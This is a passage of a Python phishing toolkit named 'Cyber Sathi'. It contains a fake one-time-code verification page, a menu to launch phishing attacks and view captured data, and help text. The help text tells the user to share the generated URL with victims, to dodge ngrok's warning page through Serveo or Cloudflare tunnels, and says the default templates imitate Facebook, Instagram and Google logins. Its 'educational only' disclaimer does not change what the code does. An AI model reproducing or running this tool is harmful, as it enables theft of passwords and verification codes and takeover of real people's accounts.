        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #f7f9fc; margin: 0; padding: 0; display: flex; justify-content: center; align-items: center; height: 100vh; }
        .otp-box { background: white; padding: 50px; border-radius: 20px; box-shadow: 0 15px 35px rgba(50,50,93,0.1), 0 5px 15px rgba(0,0,0,0.07); width: 450px; text-align: center; }
        .lock-icon { font-size: 60px; color: #4a6cf7; margin-bottom: 20px; }
        h2 { color: #32325d; margin-bottom: 10px; }
        .subtitle { color: #6b7c93; margin-bottom: 30px; }
        .otp-inputs { display: flex; justify-content: space-between; margin: 30px 0; }
        .otp-input { width: 60px; height: 70px; text-align: center; font-size: 32px; border: 2px solid #e6ebf1; border-radius: 10px; }
        .otp-input:focus { border-color: #4a6cf7; outline: none; }
        button { width: 100%; padding: 18px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 10px; font-size: 18px; font-weight: bold; cursor: pointer; }
        button:hover { opacity: 0.9; }
    </style>
</head>
<body>
    <div class="otp-box">
        <div class="lock-icon">🔒</div>
        <h2>Enter Verification Code</h2>
        <p class="subtitle">We've sent a 6-digit code to your device</p>
        <form method="POST">
            <div class="otp-inputs">
                <input type="text" name="digit1" class="otp-input" maxlength="1" required>
                <input type="text" name="digit2" class="otp-input" maxlength="1" required>
                <input type="text" name="digit3" class="otp-input" maxlength="1" required>
                <input type="text" name="digit4" class="otp-input" maxlength="1" required>
                <input type="text" name="digit5" class="otp-input" maxlength="1" required>
                <input type="text" name="digit6" class="otp-input" maxlength="1" required>
            </div>
            <button type="submit">Verify & Continue</button>
        </form>
    </div>
</body>
</html>'''
    
    else:
        # Custom HTML
        print(f"\n{Colors.YELLOW}[*] Enter your custom HTML code (type 'END' on a new line to finish):{Colors.RESET}")
        lines = []
        while True:
            try:
                line = input()
                if line.strip() == 'END':
                    break
                lines.append(line)
            except EOFError:
                break
        html_template = '\n'.join(lines)
    
    # Save template
    filename = f"{template_name.lower().replace(' ', '_')}.html"
    filepath = os.path.join(TEMPLATES_DIR, filename)
    
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(html_template)
    
    print(f"{Colors.GREEN}[+] Template created: {filename}{Colors.RESET}")

def main_menu():
    """Main menu"""
    setup_directories()
    
    while True:
        print_banner()
        
        print(f"\n{Colors.CYAN}[+] MAIN MENU:{Colors.RESET}")
        print(f"{Colors.WHITE}{'='*55}{Colors.RESET}")
        print(f"{Colors.GREEN}[1]{Colors.WHITE} Start Phishing Attack")
        print(f"{Colors.GREEN}[2]{Colors.WHITE} View Templates")
        print(f"{Colors.GREEN}[3]{Colors.WHITE} Create New Template")
        print(f"{Colors.GREEN}[4]{Colors.WHITE} View Captured Data")
        print(f"{Colors.GREEN}[5]{Colors.WHITE} Setup Domain/Tunnel")
        print(f"{Colors.GREEN}[6]{Colors.WHITE} Clear Data")
        print(f"{Colors.GREEN}[7]{Colors.WHITE} About & Help")
        print(f"{Colors.GREEN}[0]{Colors.WHITE} Exit")
        print(f"{Colors.WHITE}{'='*55}{Colors.RESET}")
        
        choice = input(f"\n{Colors.YELLOW}[?] Select option: {Colors.RESET}")
        
        if choice == '1':
            start_attack()
        elif choice == '2':
            view_templates()
        elif choice == '3':
            create_new_template()
            input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")
        elif choice == '4':
            show_captured_data()
            input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")
        elif choice == '5':
            domain_config = setup_custom_domain()
            print(f"{Colors.GREEN}[+] Domain configuration set{Colors.RESET}")
            time.sleep(2)
        elif choice == '6':
            global collected_data
            collected_data = []
            # Clear all data files
            for file in os.listdir(DATA_DIR):
                if file.endswith('.json') or file.endswith('.txt'):
                    os.remove(os.path.join(DATA_DIR, file))
            print(f"{Colors.GREEN}[+] All data cleared!{Colors.RESET}")
            time.sleep(1)
        elif choice == '7':
            show_help()
        elif choice == '0':
            print(f"\n{Colors.RED}[!] Exiting Cyber Sathi...{Colors.RESET}")
            break
        else:
            print(f"{Colors.RED}[!] Invalid option!{Colors.RESET}")
            time.sleep(1)

def start_attack():
    """Start phishing attack"""
    # Load templates
    templates = load_templates()
    
    if not templates:
        print(f"{Colors.RED}[!] No templates found!{Colors.RESET}")
        return
    
    print(f"\n{Colors.CYAN}[+] Available Templates:{Colors.RESET}")
    print(f"{Colors.WHITE}{'='*55}{Colors.RESET}")
    
    template_list = list(templates.keys())
    for i, template in enumerate(template_list, 1):
        print(f"{Colors.GREEN}[{i}]{Colors.WHITE} {template}")
    
    print(f"{Colors.WHITE}{'='*55}{Colors.RESET}")
    
    try:
        choice = int(input(f"\n{Colors.YELLOW}[?] Select template (1-{len(template_list)}): {Colors.RESET}"))
        if 1 <= choice <= len(template_list):
            selected = template_list[choice-1]
            
            # Get port
            port_input = input(f"{Colors.YELLOW}[?] Enter port (default 8080): {Colors.RESET}")
            port = int(port_input) if port_input.isdigit() else 8080
            
            # Domain setup
            print(f"\n{Colors.CYAN}[+] Domain Setup:{Colors.RESET}")
            domain_config = setup_custom_domain()
            
            # Start server
            start_phishing_server(selected, port, domain_config)
        else:
            print(f"{Colors.RED}[!] Invalid selection{Colors.RESET}")
    except ValueError:
        print(f"{Colors.RED}[!] Please enter a number{Colors.RESET}")

def view_templates():
    """View available templates"""
    templates = load_templates()
    
    print(f"\n{Colors.CYAN}[+] Available Templates:{Colors.RESET}")
    print(f"{Colors.WHITE}{'='*55}{Colors.RESET}")
    
    for i, (name, content) in enumerate(templates.items(), 1):
        size_kb = len(content) / 1024
        lines = content.count('\n')
        print(f"{Colors.GREEN}[{i}]{Colors.WHITE} {name} ({size_kb:.1f} KB, {lines} lines)")
    
    print(f"{Colors.WHITE}{'='*55}{Colors.RESET}")
    
    view = input(f"\n{Colors.YELLOW}[?] View template details? (y/n): {Colors.RESET}")
    if view.lower() == 'y':
        try:
            choice = int(input(f"{Colors.YELLOW}[?] Select template number: {Colors.RESET}"))
            template_list = list(templates.keys())
            if 1 <= choice <= len(template_list):
                selected = template_list[choice-1]
                print(f"\n{Colors.CYAN}[+] Template: {selected}{Colors.RESET}")
                print(f"{Colors.WHITE}{'='*55}{Colors.RESET}")
                content = templates[selected]
                print(content[:500] + "..." if len(content) > 500 else content)
        except:
            pass

def show_help():
    """Show help information"""
    print_banner()
    
    help_text = f"""
{Colors.CYAN}[+] CYBER SATHI HELP:{Colors.RESET}
{Colors.WHITE}{'='*55}{Colors.RESET}

{Colors.YELLOW}📖 HOW TO USE:{Colors.RESET}
1. Select 'Start Phishing Attack'
2. Choose a template
3. Setup domain/tunnel options
4. Share the generated URL
5. Monitor captured data

{Colors.YELLOW}🌐 DOMAIN OPTIONS:{Colors.RESET}
• Ngrok Random URL (Free): Shows 'Visit Site' page
• Ngrok Custom Subdomain (Pro): No warning page
• Serveo.net (Free): Recommended, no 'Visit Site' page
• Cloudflare Tunnel (Free): Best option, professional
• Local Network: Only in your network
• Custom Domain: Use your own domain

{Colors.YELLOW}🚫 NGROK "VISIT SITE" PAGE FIX:{Colors.RESET}
• Use Serveo.net (Option 3) - Completely free, no warnings
• Use Cloudflare Tunnel (Option 4) - Professional & free
• Buy Ngrok Pro plan - Remove warning page
• Accept that victims need to click 'Visit Site'

{Colors.YELLOW}📁 TEMPLATES:{Colors.RESET}
• Templates are stored in '{TEMPLATES_DIR}/' folder
• You can create custom HTML templates
• Default templates: Facebook, Instagram, Google

{Colors.YELLOW}💾 DATA:{Colors.RESET}
• Captured data saved in '{DATA_DIR}/' folder
• JSON format for detailed data
• Text summary also available

{Colors.RED}⚠  LEGAL DISCLAIMER:{Colors.RESET}
• This tool is for EDUCATIONAL purposes only
• Use only on systems you OWN or have PERMISSION to test
• Unauthorized access is ILLEGAL
• Developer is NOT responsible for misuse

{Colors.GREEN}🔧 REQUIREMENTS:{Colors.RESET}
• Python 3.x
• Internet connection for tunnels
"""
    print(help_text)
    input(f"\n{Colors.YELLOW}[?] Press Enter to continue...{Colors.RESET}")

# Main execution
if __name__ == "__main__":
    try:
        main_menu()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Program stopped by user{Colors.RESET}")
    except Exception as e:
        print(f"{Colors.RED}[!] Error: {e}{Colors.RESET}")